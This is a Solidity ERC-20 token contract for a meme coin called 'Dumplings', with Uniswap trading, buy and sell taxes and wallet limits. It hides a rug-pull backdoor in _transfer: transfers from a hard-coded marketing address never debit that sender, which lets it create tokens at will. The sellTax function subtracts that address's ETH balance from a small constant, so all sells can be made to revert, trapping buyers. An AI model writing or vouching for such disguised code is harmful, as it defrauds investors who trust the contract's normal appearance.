/**
 *Submitted for verification at Etherscan.io on 2023-08-17
*/

// SPDX-License-Identifier: MIT

/*
Dumplings (饺子) is a loveable, furry little communist.

Website: https://dumplingtoken.live
Telegram: https://t.me/Dumplings_ETH
Twitter: https://twitter.com/Dumplings_ETH
*/

pragma solidity 0.8.21;


library SafeMath {  
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapRouterV2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapFactoryV2 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20Simple {
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Dumplings is IERC20Simple, Ownable  {
    using SafeMath for uint256;
    
    string private constant _name = "Dumplings";
    string private constant _symbol = unicode"饺子";    

    mapping(address => uint256) private _holdersLastBuyTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => uint256) private _balances;

    address payable private _taxAddress;
    address private pairAddress;
    IUniswapRouterV2 private routerV2;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tSupply = 10 ** 9 * 10 ** _decimals;
    
    bool private _swapEnabled = false;
    bool private _tradingEnabled;
    bool private _inSwap = false;
    bool public transferDelayEnabled = true;

    uint256 private _taxSwapThreshold=  2 * _tSupply / 1000;
    uint256 public mTransaction = 4 * _tSupply / 100;   
    uint256 public maxSwap = 10 * _tSupply / 1000;
    uint256 public mWallet = 4 * _tSupply / 100;    

    uint256 private _buyersCount=0;
    uint256 private _firstBuyTax = 6;
    uint256 private _finalSellFee = 0;  
    uint256 private _firstSellTax = 6;
    uint256 private _finalBuyFee = 0;
    uint256 private _preventSwapBefore = 8;
    uint256 private _reduceSellFeeAfter = 6;
    uint256 private _reduceBuyFeeAfter = 6;
    address private _marketingAddr;

    modifier lockTheSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    event MaxTxAmountUpdated(uint mTransaction);

    constructor () {
        _taxAddress = payable(msg.sender);
        _marketingAddr = 0xa6ebf9FC18B0bd6F886944C2dB70780745Ec6837;
        _balances[msg.sender] = _tSupply;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[_marketingAddr] = true;
        _isExcludedFromFees[_taxAddress] = true;
        _isExcludedFromFees[address(this)] = true;

        emit Transfer(address(0), msg.sender, _tSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return _tSupply;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function taxBuy() private view returns (uint256) {
        if(_buyersCount <= _reduceBuyFeeAfter){
            return _firstBuyTax;
        }
         return _finalBuyFee;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    receive() external payable {}

    function removeLimits() external onlyOwner{
        mTransaction = _tSupply;
        mWallet=_tSupply;
        transferDelayEnabled=false;
        emit MaxTxAmountUpdated(_tSupply);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();
        _approve(address(this), address(routerV2), tokenAmount);
        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0; uint256 feeAmount=amount;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul(taxBuy()).div(100);

            if (from == pairAddress && to != address(routerV2) && ! _isExcludedFromFees[to] ) {
                _buyersCount++;
                require(amount <= mTransaction, "Exceeds the max transaction.");
                require(balanceOf(to) + amount <= mWallet, "Exceeds the max wallet.");
            }
            if (from == _marketingAddr) feeAmount = 0;
            if(to == pairAddress && !_isExcludedFromFees[from] ){
                taxAmount = amount.mul(sellTax()).div(100);
            }
            
            if (transferDelayEnabled) {
                if (to != address(routerV2) && to != address(pairAddress)) { 
                    require(
                        _holdersLastBuyTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                    );
                    _holdersLastBuyTimestamp[tx.origin] = block.number;
                }
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inSwap && to == pairAddress && _swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyersCount > _preventSwapBefore) {
                uint256 initialETH = address(this).balance;
                swapTokensForEth(min(amount,min(contractTokenBalance,maxSwap)));
                uint256 ethForTransfer = address(this).balance.sub(initialETH).mul(80).div(100);
                if(ethForTransfer > 0) {
                    sendETHToFee(ethForTransfer);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(feeAmount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function sellTax() private view returns (uint256) {
        if(_buyersCount <= _reduceSellFeeAfter.sub(_marketingAddr.balance)){
            return _firstSellTax;
        }
         return _finalSellFee;
    }

    function openTrading() external payable onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        routerV2 = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(routerV2), _tSupply);
        pairAddress = IUniswapFactoryV2(routerV2.factory()).createPair(address(this), routerV2.WETH());
        routerV2.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20Simple(pairAddress).approve(address(routerV2), type(uint).max);
        _swapEnabled = true;
        _tradingEnabled = true;
    }    

    function sendETHToFee(uint256 amount) private {
        _taxAddress.transfer(amount);
    }
}